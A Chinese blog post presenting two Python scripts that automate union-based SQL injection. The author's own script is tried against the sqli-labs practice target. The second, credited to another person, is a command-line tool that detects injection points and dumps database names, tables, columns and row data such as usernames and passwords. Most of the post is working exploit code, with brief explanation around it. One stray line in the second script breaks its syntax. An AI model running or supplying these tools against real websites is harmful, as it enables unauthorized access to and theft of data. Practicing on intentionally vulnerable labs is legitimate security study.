---
title: 简单的数字型sql注入伪自动化脚本
date: 2017-07-19 18:05:38
tags: 
- SQL注入
categories: 
- 工具
---

暑假在充实自己的时候，忙里偷闲（熬夜）写的一个针对简单的数字型注入的伪自动化脚本，道行尚浅，下面是我写的，然后再放一个大佬写的字符型和数字型都可以的 

<!--more-->

~~~python
# -*-coding:utf-8-*-
# author:ha1g0

from bs4 import BeautifulSoup
import requests
import re
import time
import string

guess=string.lowercase + string.uppercase + string.digits
# url = "http://10.0.0.121/guestbook/show_msg.php?id=71"
url = "http://localhost/sqli-labs-master/Less-2/index.php?id=1"


def orderby(url):#返回select语句查询的列数
    test = u" order by "
    raw_req = requests.get(url)
    raw_len = len(raw_req.text)
    # with open(r'F:/Programming/Python/Python test/test/1.txt','w') as raw_f:
    # 	raw_f.write(raw_req.text)
    # 	raw_f.close()
    different = []
    j = 0
    for i in range(1, 20):
        testurl = url + test + str(i)
        # print testurl
        test_req = requests.get(testurl)
        test_len = len(test_req.text)
        different.append([i, raw_len - test_len])
        rang = different[i - 1]
        if rang[1] != 0:
            break
    number = len(different) - 1
    return number

def column_number(url, id):#返回的是可以回显内容的字段number列表
    url1 = ""
    for i in range(1, orderby(url)):
        testurl = url.strip("id=%d" % id) + "id=-1 union select "
        url1 += str(i) + ","
    testurl = testurl + url1 + str(orderby(url))
    # print testurl
    req = requests.get(testurl)
    html = req.text
    soup = BeautifulSoup(html,"html.parser")
    string = soup.get_text().encode("utf8")
    echo_number = re.findall(r'(\w*[0-9]+)\w*',string)
    column_echo_number1 = list(set(echo_number))#去重
    # column_echo_number2=[]
    # asscii_string = lambda s: ''.join(map(lambda c: "%02X" % ord(c), s))#把字符串转换成ascii的 16进制
    # start_num = int(asscii_string("0"))
    # end_num = int(asscii_string(str(orderby(url))))
    # print start_num,end_num
    # for j in column_echo_number1:
    #     if int(asscii_string(j)) in range(start_num,end_num):
    #         print j
    #         column_echo_number2.append(column_echo_number1[j])
    return column_echo_number1

def union_injection_database(url,id,option):#返回含有数据库名的列表
    # database = ""
    # for i in range(1,11):
    #     try:
    #         for str in guess:
    #             str = ord(str)
    #             starttime = time.time()
    #             header = {
    #                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
    #             data = u" and If(ascii(substr(database(),%d,1))=%s,sleep(2),1)--+" % (i, str)
    #             requrl = url + data
    #             req = requests.get(requrl, headers=header)
    #             s = time.time() - starttime
    #             if s > 1:
    #                 string = chr(str)
    #                 database += string
    #     except:
    #         pass
    # return  database
    url1 = ""
    testurl = url.strip("id=%d" % id) + "id=-1 union select "
    if option =="current":
        for i in range(1, orderby(url)):
            if str(i) in column_number(url,id):
                url1 += "group_concat(0x28,database(),0x29)"+ ","
            else:
                url1 +=str(i)+","
        testurl = testurl + url1 + str(orderby(url))
    elif option =="all":
        for i in range(1, orderby(url)):
            if str(i) in column_number(url, id):
                url1 +="group_concat(0x28,schema_name,0x29)"+","
            else:
                url1 +=str(i)+","
        testurl= testurl +url1 +str(orderby(url))+" from information_schema.schemata"
    # print testurl
    req = requests.get(testurl)
    html = req.text
    soup = BeautifulSoup(html, "html.parser")
    string = soup.get_text().encode("utf8")
    pstring = re.sub('[^a-zA-Z()_0-9]','',string)
    # print pstring
    a = re.findall(ur"[^(（]+(?=[)）])",pstring)
    a = list(set(a))
    return a

def union_injection_table(url,id,database_name):#返回指定数据库下的表名
    url1 = ""
    testurl = url.strip("id=%d" % id) + "id=-1 union select "
    for i in range(1, orderby(url)):
        if str(i) in column_number(url, id):
            url1 +="group_concat(0x28,table_name,0x29)"+","
        else:
            url1 +=str(i)+","
    testurl= testurl +url1 +str(orderby(url))+" from information_schema.tables where table_schema='%s'"%database_name
    # print testurl
    req = requests.get(testurl)
    html = req.text
    soup = BeautifulSoup(html, "html.parser")
    string = soup.get_text().encode("utf8")
    pstring = re.sub('[^a-zA-Z()_0-9]','',string)
    # print pstring
    a = re.findall(ur"[^(（]+(?=[)）])",pstring)
    # print  a
    return a 

def union_injection_column(url,id,tablename):#返回指定表的列名
    url1 = ""
    testurl = url.strip("id=%d" % id) + "id=-1 union select "
    for i in range(1, orderby(url)):
        if str(i) in column_number(url, id):
            url1 +="group_concat(0x28,column_name,0x29)"+","
        else:
            url1 +=str(i)+","
    testurl= testurl +url1 +str(orderby(url))+" from information_schema.columns where table_name='%s'"%tablename
    # print testurl
    req = requests.get(testurl)
    html = req.text
    soup = BeautifulSoup(html, "html.parser")
    string = soup.get_text().encode("utf8")
    pstring = re.sub('[^a-zA-Z()_0-9]','',string)
    # print pstring
    a = re.findall(ur"[^(（]+(?=[)）])",pstring)
    # print  a
    return a 


def union_injection_content(url,id,tablename,column):#返回指定列名的内容
    url1 = ""
    testurl = url.strip("id=%d" % id) + "id=-1 union select "
    for i in range(1, orderby(url)):
        if str(i) in column_number(url, id):
            url1 +="group_concat(0x28,%s,0x29)"%column+","
        else:
            url1 +=str(i)+","
    testurl= testurl +url1 +str(orderby(url))+" from %s"%tablename
    # print testurl
    req = requests.get(testurl)
    html = req.text
    soup = BeautifulSoup(html, "html.parser")
    string = soup.get_text().encode("utf8")
    pstring = re.sub('[^a-zA-Z()@._0-9]','',string)
    # print pstring
    a = re.findall(ur"[^(（]+(?=[)）])",pstring)
    # print  a
    return a 


if __name__=="__main__":
    # print column_number(url,71)
    id= raw_input("id:")
    id =int(id)
    current_databse =str(list(union_injection_database(url, id,"current"))[0])
    print "current_database:",current_databse
    print "the tables of current_database:"
    print union_injection_table(url, id,current_databse)
    tablename = raw_input("table:")
    print "the name of column:"
    print union_injection_column(url, id, tablename)
    for i in union_injection_column(url,id,tablename):
        flag = raw_input("do you want to get the content of column(y/n)")
        if flag =="y":
            column_name=raw_input("column_name:")
            print union_injection_content(url, id,tablename,column_name)
        else:
            print "break"
            break
~~~

简单的union注入，判断order by字段数，通过html的变化来找到字段数（把order by 2及其以后的html跟order by 1 的html进行比较，标记出现不同的包，取这个包对应数字-1，这个数字就是order by 字段数）。
判断select可以回显注入语句的判断点的函数，这个地方我就卡住了，然后师傅就给了一个思路，注入语句前后2侧放个标识符，然后通过正则，匹配标识符内的内容（diao爆了），然后下面的爆库，爆表等等的内容就只是payload的组合问题了。

当然光给脚本，不给出结果图是没有说服力的，我就用sqllab的less2来做靶场，试试我这个脚本
![](https://ws1.sinaimg.cn/large/00699yRSly1fhpdgeirqwj30qr0jz74x.jpg)

id是输入的URL后面的id数，有的页面会一个id数，一个页面


~~~python
#!/usr/bin/env python
# coding:utf-8
import hackhttp
import re
from optparse import OptionParser
from prettytable import PrettyTable

def urlencode(string):
    '''对相关字符进行url编码，这里使用的是替换'''
    string = string.replace(" ", "%20") # 空格
    string = string.replace("'", "%27") # 单引号
    string = string.replace("#", "%23") # #号
    return string

def getHTML(target):
    '''获取指定连接的html代码,使用的是hackhttp'''
    hh = hackhttp.hackhttp()
    _, _, html, _, _ = hh.http(target)
    return html

def CreateSelect(Colnum):
    '''根据字段长度创建select payload，类似于select 1,2,3……'''
    payload = "and 9999=9998 union select "
    for i in range(1, Colnum + 1):
        if Colnum == i: # 如果是最大数，末尾不应当有,
            payload += "{}".format(i)
        else:              # 如果是中间，末尾应当有,
            payload += "{},".format(i)
    return payload

def replacePosition(payload, position, inje):
    '''替换回显位'''
    rep = "concat(0x7B7B7B7B7B7B,group_concat({}),0x7D7D7D7D7D7D)".format(inje) # 前后加上标志位
    ret = payload.replace(position, rep)
    return ret
{{{{{{xxxxx}}}}}}

def CreatePayload(url, payload, p_type = 0):
    '''根据注入类型来创建最终payload'''
    if p_type == 0: # 无引号
        ret = "{} {}".format(url, payload)
    elif p_type == 1: # 带引号
        ret = "{}' {} #".format(url, payload)
    return urlencode(ret)

def getResult(html):
    '''使用正则取回显结果'''
    re1 = '{{{{{{(.*)}}}}}}' # 第一次，把关键位置的HTML先取出来
    ret = re.findall(re1, html)[0]
    return ret

def checkSqlInje(url):
    '''检查url是否存在注入，利用的是and 1=1，and 1=2方法'''
    # 不带引号的注入
    target1 = CreatePayload(url, "and 9999=9999")
    target2 = CreatePayload(url, "and 9999=9998")
    if getHTML(target1) != getHTML(target2):
        print "[***] 存在SQL注入漏洞，类型为数字型, --injetype=0"
        return 0
    # 带引号的注入
    target1 = CreatePayload(url, "and 9999=9999", 1)
    target2 = CreatePayload(url, "and 9999=9998", 1)
    if getHTML(target1) != getHTML(target2):
        print "[***] 存在SQL注入漏洞，类型为字符型, --injetype=1"
        return 1
    print "[!!!] 不存在SQL注入漏洞"
    return

def getColumsNum(url, p_type):
    '''获取注入点的字段长度'''
    # 获取正常页面的body长度
    payload = "order by 1"
    target = CreatePayload(url, payload, p_type)
    html_ok = getHTML(target)
    for i in range(2, 99):
        # 获取加入payload的页面body长度
        payload = " order by {}".format(i)
        target = CreatePayload(url, payload, p_type)
        html_test = getHTML(target)
        if html_ok != html_test:
            # 如果body和正常页面的不同，说明最终结果应该是当前字段数-1
            colnum = i - 1
            print "[***] 字段数为 {}, --colnum={}".format(colnum, colnum)
            return

def getCurrentDBName(url, position, payload, p_type):
    '''获取当前使用的数据库名称'''
    inje = "database()"
    payload = replacePosition(payload, position, inje) # 替换回显位    
    target = CreatePayload(url, payload, p_type) # 生成最终提交的url
    html = getHTML(target)   # 提交
    result = getResult(html) # 获取结果
    print "[***] 当前数据库名称 {} ".format(result)

def getAllDBName(url, position, payload, p_type):
    '''获取服务器上所有数据库名'''
    inje = "distinct table_schema"
    payload = replacePosition(payload, position, inje) # 替换回显位
    payload += " from information_schema.tables" # 补全后面的payload
    target = CreatePayload(url, payload, p_type) # 生成最终提交的url
    print target
    html = getHTML(target)   # 提交
    result = getResult(html) # 获取结果
    print "[***] 所有数据库名称"
    for D_Name in result.split(","): # 以,分割，然后遍历结果
        print "[D] {}".format(D_Name)

def getTableName(url, position, payload, p_type, DBName):
    inje = "table_name"
    payload = replacePosition(payload, position, inje) # 替换回显位
    payload += " from information_schema.tables where table_schema='{}'".format(DBName) # 补全后面的payload
    target = CreatePayload(url, payload, p_type) # 生成最终提交的url
    html = getHTML(target)   # 提交
    result = getResult(html) # 获取结果
    print "[***] {} 中所有表".format(DBName)
    for T_Name in result.split(","): # 以,分割，然后遍历结果
        print "[T] {}".format(T_Name)

def getColumnName(url, position, payload, p_type, DBName, TableName):
    inje = "column_name"
    payload = replacePosition(payload, position, inje) # 替换回显位
    payload += " from information_schema.columns where table_schema='{}' and table_name='{}'".format(DBName, TableName)
    target = CreatePayload(url, payload, p_type)
    html = getHTML(target)   # 提交
    result = getResult(html) # 获取结果
    print "[***] {}.{} 中所有列".format(DBName, TableName)
    for C_Name in result.split(","): # 以,分割，然后遍历结果
        print "[C] {}".format(C_Name)

def getData(url, position, payload, p_type, DBName, TableName, ColumnName):
    inje = ColumnName.replace(",", ",0x7c7c7c,") # 在每列之间添加分隔符 |||
    payload = replacePosition(payload, position, inje) # 替换回显位
    print payload
    payload += " from {}.{}".format(DBName, TableName)
    target = CreatePayload(url, payload, p_type)
    html = getHTML(target)   # 提交
    result = getResult(html) # 获取结果
    print "[***] {}.{} 中的数据".format(DBName, TableName)
    x = PrettyTable(ColumnName.split(",")) # 创建表格，添加表头
    x.align = "l"                          # 数据左对齐
    for data in  getResult(html).split(","):
        x.add_row(data.split("|||"))       # 以分隔符|||分割之后，向表中添加数据 
    print x                                # 打印表格
    

def main():
    # 参数解析, 路由
    parser = OptionParser()
    parser.add_option( "-u","--url", action = "store", dest = "url", metavar = "URL",
        help = "show all database name")
    parser.add_option( "--check", action = "store_true", dest = "check", default = False,
        help = "check the url injection vuln")
    parser.add_option( "--dbs", action = "store_true", dest = "dbs", default = False,
        help = "show all database name")
    parser.add_option( "--tables", action = "store_true", dest = "tables", default = False,
        help = "show all table name in database")
    parser.add_option( "--columns", action = "store_true", dest = "columns", default = False,
        help = "show all columns name in table")
    parser.add_option( "--dump", action = "store_true", dest = "dump", default = False,
        help = "show data in table")
    parser.add_option("--injetype", action = "store", dest = "injetype", type="string", metavar = "Inje_Type",
        help = "Set the injection type,0=not dot, 1=has dot              eg. --injetype 0    --injetype=1")
    parser.add_option("--colnum", action = "store", dest = "colnum", type="string", metavar = "COLUMN_NUM",
        help = "Set the column number                                    eg. --Colnum 11     --Colnum=9")
    parser.add_option("--position", action = "store", dest = "position", type="string", metavar = "position",
        help = "Set the position                                         eg. --position 7    --position=4")
    parser.add_option("-D", action = "store", dest = "D_Name", type="string", metavar = "DATABASE_NAME",
        help = "Set the database name                                    eg. -D phplyb")
    parser.add_option("-T", action = "store", dest = "T_Name", type="string", metavar = "TABLE_NAME",
        help = "Set the table name                                       eg. -T admin")
    parser.add_option("-C", action = "store", dest = "C_Name", type="string", metavar = "column,column",
        help = "Set the database name                                    eg. -C id,username,password")
    (options, args) = parser.parse_args() # 创建参数

    url = options.url
    if options.check == True: # 进入检查 --check
        p_type = checkSqlInje(url)
        if p_type != None:
            getColumsNum(url, p_type)
        exit()
    p_type = int(options.injetype)  # 获取注入类型 --injetype
    position = options.position     # 获取回显位   --position
    colnum = int(options.colnum)    # 获取字段数   --colnum
    payload = CreateSelect(colnum)  # 生成payload
    if options.dbs == True:         # 读取数据库 --dbs
        getCurrentDBName(url, position, payload, p_type)
        getAllDBName(url, position, payload, p_type)
        exit()
    DBName = options.D_Name         # 获取数据库名  -D
    if options.tables == True:      # 读取表名     --tables
        getTableName(url, position, payload, p_type, DBName)
        exit()
    TableName = options.T_Name      # 获取表名     -T
    if options.columns == True:     # 读取列名     --columns
        getColumnName(url, position, payload, p_type, DBName, TableName)
        exit()
    ColumnName = options.C_Name     # 获取列名     -C
    if options.dump == True:        # 读取数据     --dump
        getData(url, position, payload, p_type, DBName, TableName, ColumnName)
        exit()

if __name__ == '__main__':
    main()
~~~

看完大佬的代码，简洁华丽，思路清晰，也许这就是我这种渣渣跟大佬的区别把。